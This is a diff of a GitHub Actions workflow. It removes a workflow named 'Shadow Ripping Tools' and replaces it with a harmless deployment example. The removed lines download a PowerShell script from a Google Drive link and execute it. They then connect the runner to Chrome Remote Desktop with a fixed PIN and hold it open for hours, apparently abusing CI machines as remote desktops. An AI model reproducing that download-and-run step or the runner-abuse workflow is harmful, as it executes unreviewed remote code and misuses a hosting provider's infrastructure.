@@ -1,33 +1,33 @@
-# WRITTEN BY Shadow Hacker 99 AND MANAGED BY The Wizard 99
-
-name: Shadow Ripping Tools
+name: Basic Workflow Dispatch Example
 
 on:
   workflow_dispatch:
     inputs:
-      code:
-        description: Paste CRD's 2nd Code
+      environment:
+        description: 'The environment to deploy to'
         required: true
+        default: 'dev'
+        type: choice
+        options:
+          - production
+          - qa
+          - dev
+      notify:
+        description: 'Should workflow notify team?'
+        required: true
+        type: boolean
+
 
 jobs:
-  build:
-    name: Shadow Ripping Lab Running
-    runs-on: windows-latest
-
+  deploy:
+    runs-on: ubuntu-latest
     steps:
-    - name: Downloading And Installing Tools
-      run: |
-        # WAIT FOR 3-4 MINUTES 
-        Invoke-WebRequest -Uri "https://drive.usercontent.google.com/download?id=1IWdNFHaewULn7tN8ZOnp3fMfsSSuCxOU&export=download&authuser=0&confirm=t&uuid=fdbceb6f-1b4d-49c1-9128-d38cf855055b&at=APZUnTVUm1AGqItiY6LCUoXfH13d%3A1716612457921" -OutFile "ripper.ps1" && ./ripper.ps1
-    - name: Starting VirtualMachine 
-      run: |
-        # CONNECTING WITH VIRTUAL MACHINE
-        ${{ inputs.code }} -pin=123456
-    - name: VirtualMachine is Running
-      run: |
-        $i = 360
-         do {
-             Write-Host $i
-             Sleep 60
-             $i--
-        } while ($i -gt 0)
+      - name: Checkout
+        uses: actions/checkout@v2
+
+      - name: Deploy
+        run: echo "Deploying to ${{ github.event.inputs.environment }} environment"
+
+      - name: Notify
+        if: ${{ github.event.inputs.notify }}
+        run: echo "Notifying of ${{ github.event.inputs.environment }} deployment"
